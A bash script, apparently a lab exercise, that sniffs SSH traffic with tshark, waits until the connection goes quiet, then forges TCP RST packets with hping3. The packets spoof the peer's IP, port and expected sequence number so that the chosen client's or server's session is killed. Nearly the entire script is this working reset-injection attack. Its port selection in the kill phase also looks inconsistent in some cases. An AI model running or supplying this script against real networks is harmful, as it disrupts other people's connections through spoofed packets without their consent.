#!/bin/bash

# Configuration
IFACE="eth0"         # CHANGE THIS to your interface (check with ip a)
PORT=22              # SSH Port
STABILIZE_TIME=30    # Seconds to wait for silence
LAST_PKT_FILE="/tmp/last_packet_info.txt"

# check for root
if [ "$EUID" -ne 0 ]; then
  echo "[-] Please run as root."
  exit 1
fi

echo "[*] Monitoring SSH (Port $PORT) on $IFACE..."
echo "[*] Connection is considered stabilized after $STABILIZE_TIME seconds of silence."

# Initialize silence counter
silence_counter=0

# Clean up previous runs
rm -f "$LAST_PKT_FILE"

# We use process substitution <(...) to feed tshark output into the loop.
# This prevents the loop from running in a subshell, allowing us to break out of it properly.
# We request specific fields to handle the "Display Headers" requirement.
# TCP len (payload) is needed to check if it's a data packet.

while read -t 1 -a FIELDS; do
    # 'read -t 1' returns exit code > 128 if it times out (no packet seen for 1 sec)
    # If read returns 0 (success), a packet arrived.
    
    if [ $? -eq 0 ]; then
        # --- PACKET DETECTED ---
        
        # Reset silence counter
        silence_counter=0
        
        # Parse the fields (Order must match the tshark command below)
        # 0=IP.SRC 1=IP.DST 2=TCP.SPORT 3=TCP.DPORT 4=TCP.SEQ 5=TCP.ACK 6=TCP.LEN
        # 7=IP.VER 8=IP.HLEN 9=IP.TOS 10=IP.LEN 11=IP.ID 12=IP.FLAGS 13=IP.TTL 14=IP.PROTO 15=IP.CHKSUM
        # 16=TCP.HLEN 17=TCP.FLAGS 18=TCP.WIN 19=TCP.CHKSUM 20=TCP.URG
        
        IP_SRC=${FIELDS[0]}
        IP_DST=${FIELDS[1]}
        TCP_SPORT=${FIELDS[2]}
        TCP_DPORT=${FIELDS[3]}
        TCP_SEQ=${FIELDS[4]}
        TCP_ACK=${FIELDS[5]}
        TCP_PAYLOAD_LEN=${FIELDS[6]}
        
        # Save this packet details to a file so we can use them outside the loop later
        echo "${FIELDS[@]}" > "$LAST_PKT_FILE"

        # Check if packet has Application Data (TCP Payload > 0)
        # Note: tshark might output empty string for 0 length, so we default to 0
        LEN="${TCP_PAYLOAD_LEN:-0}"
        
        if [ "$LEN" -eq 0 ]; then
            echo "---------------------------------------------------------------"
            echo "[!] Control Packet (No Data) - Displaying Headers:"
            echo "    [IP] Ver:${FIELDS[7]} IHL:${FIELDS[8]} TOS:${FIELDS[9]} Len:${FIELDS[10]} ID:${FIELDS[11]} Flags:${FIELDS[12]} TTL:${FIELDS[13]} Proto:${FIELDS[14]} Chk:${FIELDS[15]}"
            echo "    [IP] Src: $IP_SRC  ->  Dst: $IP_DST"
            echo "    [TCP] Sport:$TCP_SPORT Dport:$TCP_DPORT Seq:$TCP_SEQ Ack:$TCP_ACK Len:${FIELDS[16]} Flags:${FIELDS[17]} Win:${FIELDS[18]} Chk:${FIELDS[19]} Urg:${FIELDS[20]}"
            echo "---------------------------------------------------------------"
        else
            # Visual feedback for data packets
            echo -n "."
        fi
        
    else
        # --- NO PACKET (TIMEOUT) ---
        # Increment counter
        ((silence_counter++))
        
        # Display status
        echo -ne "\r[*] Silence: $silence_counter / $STABILIZE_TIME seconds   "
        
        if [ "$silence_counter" -ge "$STABILIZE_TIME" ]; then
            echo ""
            echo "[+] Connection Stabilized!"
            break
        fi
    fi

done < <(tshark -i "$IFACE" -l -n \
    -Y "tcp.port == $PORT" \
    -T fields \
    -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e tcp.seq -e tcp.ack -e tcp.len \
    -e ip.version -e ip.hdr_len -e ip.dsfield -e ip.len -e ip.id -e ip.flags -e ip.ttl -e ip.proto -e ip.checksum \
    -e tcp.hdr_len -e tcp.flags -e tcp.window_size_value -e tcp.checksum -e tcp.urgent_pointer 2>/dev/null)


# --- KILL PHASE ---

if [ ! -f "$LAST_PKT_FILE" ]; then
    echo "[-] No packets captured. Exiting."
    exit 1
fi

# Read back the last packet info
read -a LAST_PKT < "$LAST_PKT_FILE"

SRC_IP=${LAST_PKT[0]}
DST_IP=${LAST_PKT[1]}
SPORT=${LAST_PKT[2]}
DPORT=${LAST_PKT[3]}
SEQ=${LAST_PKT[4]}
ACK=${LAST_PKT[5]}
LEN=${LAST_PKT[6]:-0}

echo ""
echo "=========================================="
echo "Last Packet Seen:"
echo "$SRC_IP:$SPORT -> $DST_IP:$DPORT"
echo "SEQ: $SEQ | ACK: $ACK | LEN: $LEN"
echo "=========================================="
echo ""
echo "Which party do you want to kill?"
echo "1) Client"
echo "2) Server"
read -p "Select (1/2): " CHOICE

# Determine Target IP and construct the Killer Packet
# We need to spoof the Sender to kill the Receiver.
# To kill the Receiver, we send a RST with SEQ = Receiver's expected SEQ.

# Variables for hping3
TARGET_IP=""
SPOOF_IP=""
TARGET_PORT=""
SPOOF_PORT=""
KILL_SEQ=""

# Logic to identify Client vs Server based on Port 22
if [ "$SPORT" -eq 22 ]; then
    # Last packet was SERVER -> CLIENT
    SERVER_IP=$SRC_IP
    CLIENT_IP=$DST_IP
    SERVER_SEQ=$SEQ
    CLIENT_ACK=$ACK
    # Next SEQ Client expects = Server SEQ + Len
    NEXT_EXPECTED_BY_CLIENT=$(($SERVER_SEQ + $LEN))
    NEXT_EXPECTED_BY_SERVER=$CLIENT_ACK 
else
    # Last packet was CLIENT -> SERVER
    CLIENT_IP=$SRC_IP
    SERVER_IP=$DST_IP
    CLIENT_SEQ=$SEQ
    SERVER_ACK=$ACK
    # Next SEQ Server expects = Client SEQ + Len
    NEXT_EXPECTED_BY_SERVER=$(($CLIENT_SEQ + $LEN))
    NEXT_EXPECTED_BY_CLIENT=$SERVER_ACK
fi

if [ "$CHOICE" == "1" ]; then
    echo "[*] Target: Client ($CLIENT_IP)"
    TARGET_IP=$CLIENT_IP
    SPOOF_IP=$SERVER_IP
    TARGET_PORT=$DPORT # Client's high port
    SPOOF_PORT=22
    # Client expects the next sequence number from server
    KILL_SEQ=$NEXT_EXPECTED_BY_CLIENT
    
elif [ "$CHOICE" == "2" ]; then
    echo "[*] Target: Server ($SERVER_IP)"
    TARGET_IP=$SERVER_IP
    SPOOF_IP=$CLIENT_IP
    TARGET_PORT=22
    SPOOF_PORT=$SPORT # Client's high port
    # Server expects the next sequence number from client
    KILL_SEQ=$NEXT_EXPECTED_BY_SERVER
else
    echo "Invalid option."
    exit 1
fi

echo "[*] Injecting RST packet to $TARGET_IP..."
echo "[*] Spoofing $SPOOF_IP, SEQ=$KILL_SEQ"

# hping3 arguments:
# -a: Spoof source IP
# -s: Source port
# -p: Dest port
# -R: Reset flag
# -A: Ack flag (sometimes helps bypass firewalls, though strict RST is -R)
# -M: Sequence number
# -c: Count

hping3 "$TARGET_IP" -a "$SPOOF_IP" \
    -s "$SPOOF_PORT" -p "$TARGET_PORT" \
    -R -A -M "$KILL_SEQ" \
    -c 3 >/dev/null 2>&1

echo "[✔] RST Sent. Connection should be terminated."